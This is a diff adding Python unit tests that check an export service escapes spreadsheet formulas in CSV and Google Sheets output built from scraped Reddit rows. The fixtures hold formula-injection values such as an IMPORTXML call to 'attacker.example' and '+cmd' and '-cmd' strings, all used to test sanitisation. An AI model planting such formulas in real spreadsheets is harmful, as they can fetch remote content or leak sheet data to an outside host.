@@ -1,3 +1,4 @@
+import csv
 from unittest.mock import AsyncMock, MagicMock, patch
 
 from export_sheets import ExportService
@@ -54,6 +55,40 @@ async def test_export_service_works_without_sheets_config(tmp_path):
     assert result.row_count == 0
     assert result.warning is None
     assert result.sheet_url is None
+
+
+async def test_export_service_escapes_spreadsheet_formulas_in_csv(tmp_path):
+    db = AsyncMock()
+    db.list_export_rows.return_value = [
+        {
+            "created_at": "2026-02-24T00:00:00",
+            "subreddit": "python",
+            "source": "reddit",
+            "post_id": "abc",
+            "title": "=IMPORTXML(\"https://attacker.example\")",
+            "summary": "  @SUM(1,1)",
+            "pain_level": 8,
+            "willingness_to_pay": 9,
+            "niche_category": "+Finance",
+            "competitor_tags": "[]",
+            "category": "complaint",
+            "severity": "high",
+            "triage_status": "new",
+            "deep_dive_status": "not_requested",
+            "deep_dive_summary": "-cmd",
+            "url": "https://reddit.com/abc",
+        }
+    ]
+    service = ExportService(db=db, reports_dir=str(tmp_path), min_wtp=8)
+
+    result = await service.export()
+
+    with open(result.csv_path, newline="", encoding="utf-8") as handle:
+        row = next(csv.DictReader(handle))
+    assert row["title"].startswith("'=")
+    assert row["summary"].startswith("'  @")
+    assert row["niche_category"].startswith("'+")
+    assert row["deep_dive_summary"].startswith("'-")
 
 
 async def test_export_service_returns_sheet_url_on_success(tmp_path):
@@ -118,3 +153,72 @@ async def test_upsert_google_sheet_is_sync_method(tmp_path):
     assert not _asyncio.iscoroutinefunction(service._upsert_google_sheet), (
         "_upsert_google_sheet must stay synchronous"
     )
+
+
+def test_upsert_google_sheet_escapes_spreadsheet_formulas(tmp_path):
+    db = MagicMock()
+    service = ExportService(
+        db=db,
+        reports_dir=str(tmp_path),
+        min_wtp=8,
+        sheets_credentials_json='{"type": "service_account"}',
+        sheets_spreadsheet_id="sheet-id",
+    )
+    worksheet = MagicMock()
+    spreadsheet = MagicMock()
+    spreadsheet.worksheet.return_value = worksheet
+    client = MagicMock()
+    client.open_by_key.return_value = spreadsheet
+    fake_gspread = MagicMock()
+    fake_gspread.WorksheetNotFound = RuntimeError
+    fake_gspread.service_account_from_dict.return_value = client
+
+    with patch("export_sheets.gspread", fake_gspread):
+        service._upsert_google_sheet(
+            rows=[
+                {
+                    "created_at": "2026-02-24T00:00:00",
+                    "subreddit": "python",
+                    "source": "reddit",
+                    "post_id": "abc",
+                    "title": "=IMPORTXML(\"https://attacker.example\")",
+                    "summary": "@SUM(1,1)",
+                    "pain_level": 8,
+                    "willingness_to_pay": 9,
+                    "niche_category": "-Finance",
+                    "competitor_tags": "[]",
+                    "category": "complaint",
+                    "severity": "high",
+                    "triage_status": "new",
+                    "deep_dive_status": "not_requested",
+                    "deep_dive_summary": "+cmd",
+                    "url": "https://reddit.com/abc",
+                }
+            ],
+            headers=[
+                "created_at",
+                "subreddit",
+                "source",
+                "post_id",
+                "title",
+                "summary",
+                "pain_level",
+                "willingness_to_pay",
+                "niche_category",
+                "competitor_tags",
+                "category",
+                "severity",
+                "triage_status",
+                "deep_dive_status",
+                "deep_dive_summary",
+                "url",
+            ],
+            subreddit=None,
+        )
+
+    values = worksheet.update.call_args.args[1]
+    data_row = values[1]
+    assert data_row[4].startswith("'=")
+    assert data_row[5].startswith("'@")
+    assert data_row[8].startswith("'-")
+    assert data_row[14].startswith("'+")
